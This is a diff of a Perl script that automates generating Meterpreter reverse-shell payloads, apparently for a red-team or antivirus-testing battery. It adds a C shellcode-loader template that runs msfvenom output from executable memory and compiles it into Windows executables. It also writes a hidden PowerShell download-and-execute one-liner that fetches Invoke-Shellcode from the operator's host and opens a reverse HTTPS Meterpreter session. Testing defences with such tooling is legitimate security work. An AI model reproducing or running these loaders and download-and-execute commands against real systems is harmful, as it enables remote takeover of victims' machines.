@@ -285,13 +285,13 @@ TCPNOENC64
 
 
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
-  print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
+  print "\n\n*** 64 Bit Meterpreter C Shell Code, XOR encoded: $cmd\n";
   `$cmd`;
-  `cp ./inc/meterpreter_x64.c $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c`;
-  `echo "#!/bin/sh" >$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
-  `echo "x86_64-w64-mingw32-gcc 115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c  -o 115-${PROJECT}-${PROJECTNUM}-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
-  `chmod +x $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
-
+  #`cp ./inc/meterpreter_x64enc.c $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c`;
+  #`echo "#!/bin/sh" >$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
+  #`echo "x86_64-w64-mingw32-gcc 115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c  -o 115-${PROJECT}-${PROJECTNUM}-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
+  #`chmod +x $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
+ &createShellcodeEXEFromTemplate(631,"$targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c");
 
   `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;
 
@@ -390,10 +390,10 @@ TCPSTAGELESS64
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/175-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
   print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
   `$cmd`;
-  `cp ./inc/meterpreter_x64.c $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c`;
+  `cp ./inc/stagelessmeterpreter_x64enc.c $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c`;
   `echo "#!/bin/sh" >$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
   `echo "x86_64-w64-mingw32-gcc 175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c  -o 175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-CustomTemplate.exe" >>$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
-  `chmod +x i$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
+  `chmod +x $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
 
 
   $payload = 'windows/x64/meterpreter/reverse_tcp';
@@ -438,8 +438,8 @@ RHTTPSNOENC
     `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
   }
   my ($ShellCodePath) ="./inc/Invoke-Shellcode.ps1";
-  `cp $ShellCodePath $targetFolder/202_Invoke-Shellcode.ps1`;
-  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/201_Invoke-Shellcode.ps1`;
+  `cp $ShellCodePath $targetFolder/202-Invoke-Shellcode.ps1`;
+  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/202-Invoke-Shellcode.ps1`;
   $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/202-Invoke-Shellcode.ps1'))";
   open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
   print $OUTFILE $cmd;
@@ -583,7 +583,61 @@ MACSHELL1
   `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0003-eicar.com.jpg`;
   `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
   `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
-  `zip -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip /opt/malwaredefense/current/*`;
+  `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip /opt/malwaredefense/current/*`;
+  `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip `;
+
+
+
+
+
+
+sub createShellcodeEXEFromTemplate{
+  my($venomFile, $VENOM, $codeSize, $outCFile, $outEXEFile, $OUTPUT);
+  $codeSize = shift;
+  $venomFile = shift;
+  $outEXEFile = $venomFile;
+  $outEXEFile =~ s/c$/exe/;
+  $outCFile = $venomFile;
+  $outCFile =~ s/\.c$/-FullTemplate.c/;
+  open($OUTPUT, ">",$outCFile);
+  print $OUTPUT <<SHELL_CODE_TEMPLATE_START;
+#include <stdio.h>
+#include <windows.h> //VirtualAlloc is defined here
+//YOU MUST REPLACE the buf and the size 
+SHELL_CODE_TEMPLATE_START
+  open($VENOM, "<",$venomFile);
+  print $OUTPUT "size_t size = $codeSize; //size of buf in bytes (output by msfvenom)\n\n";
+  while(<$VENOM>){
+    print $OUTPUT $_;
+  }
+  close($VENOM);
+  print $OUTPUT <<SHELL_CODE_TEMPLATE_END;
+int main(int argc, char **argv) {
+char *code;                     //Holds a memory address
+code = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address
+        NULL, size, MEM_COMMIT,     
+        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable
+    );
+memcpy(code, buf, size);    //Copy our spud into the executable section of memory
+((void(*)())code)();            //Cast the executable memory to a function pointer and run it
+return(0);
+}
+SHELL_CODE_TEMPLATE_END
+  close($OUTPUT);
+  $outEXEFile = $outCFile;
+  $outEXEFile =~ s/c$/exe/;
+  $_=$outEXEFile;
+  if (/64/){
+    `x86_64-w64-mingw32-gcc $outCFile -o $outEXEFile`;
+  }else{
+    `i686-w64-mingw32-gcc $outCFile  -o $outEXEFile`;
+  }
+  print "Completed gerneration of $outEXEFile\n";
+}
+
+
+
+
 
 
  
